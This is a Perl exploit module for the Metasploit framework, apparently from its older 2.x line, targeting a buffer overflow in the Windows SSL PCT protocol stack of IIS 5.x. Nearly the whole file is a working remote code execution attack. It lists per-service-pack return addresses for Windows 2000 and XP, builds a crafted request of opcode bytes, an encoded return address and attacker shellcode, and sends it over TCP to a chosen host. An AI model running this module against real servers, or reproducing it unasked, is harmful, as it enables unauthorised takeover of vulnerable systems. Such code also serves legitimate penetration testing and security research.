package Msf::Exploit::iis5x_ssl_pct;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
'Name' => 'IIS 5.x SSL PCT Overflow',
'Version' => '$Revision: 1.22 $',
'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
'Johnny Cyberpunk <jcyberpunk@thc.org> [Unknown License]' ],
'Arch' => [ 'x86' ],
'OS' => [ 'win32' ],
'Priv' => 1,
'AutoOpts' => { 'EXITFUNC' => 'thread' },
'UserOpts' => {
'RHOST' => [1, 'ADDR', 'The target address'],
'RPORT' => [1, 'PORT', 'The target port', 443],
},

'Payload' => {
'MinNops' => 0,
'MaxNops' => 0, 
'Space' => 1800,
'BadChars' => '',
},

'Description' => qq{
This module exploits a buffer overflow in the Microsoft Windows PCT
protocol stack. This code is based on Johnny Cyberpunk's THC release
and has been tested against Windows 2000 and Windows XP. This vulnerability
may not affect Windows 2000 SP0 or Windows 2003.
},

'Refs' => [
],
'Targets' => [
#['Windows 2000 SP4/SP3', 0x6741a7c6],
['Windows 2000 SP4', 0x67419ce8],
['Windows 2000 SP3', 0x67419e1d],
['Windows 2000 SP2', 0x6741a426],
['Windows 2000 SP1', 0x6741a199],
['Windows XP SP0', 0x0ffb7de9],
['Windows XP SP1', 0x0ffb832f],
],
};

sub new {
my $class = shift;
my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
return($self);
}

sub Exploit {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $target_idx = $self->GetVar('TARGET');
my $shellcode = $self->GetVar('EncodedPayload')->Payload;

my $target = $self->Targets->[$target_idx];

$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

# return address is [esp+0x6c] (dssenh.dll)
# this is a heap ptr to the ssl request
# ... and just happens to not die
# thanks to CORE, Halvar, JohnnyC :)
#
# 80620101 => and byte ptr [esi+1], 0x2
# bd00010001 => mov ebp, 0x1000100
# 0016 => add [esi], dl
# 8f8201000000 => pop [esi+1]
# eb0f => jmp short 11 to shellcode

my $request =
"\x80\x66\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x86\x01\x00\x00\x00".
"\xeb\x0f".'XXXXXXXXXXX'.pack('V', ($target->[1] ^ 0xffffffff)).
$shellcode;

my $s = Msf::Socket->new({'SSL' => 0});
if (! $s->Tcp($target_host, $target_port))
{
$self->PrintLine("[*] Error: could not connect: " . $s->GetError());
return;
}

$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
$s->Send($request);

$self->PrintLine("[*] Waiting for a response...");
my $r = $s->Recv(-1, 5);

return;
}
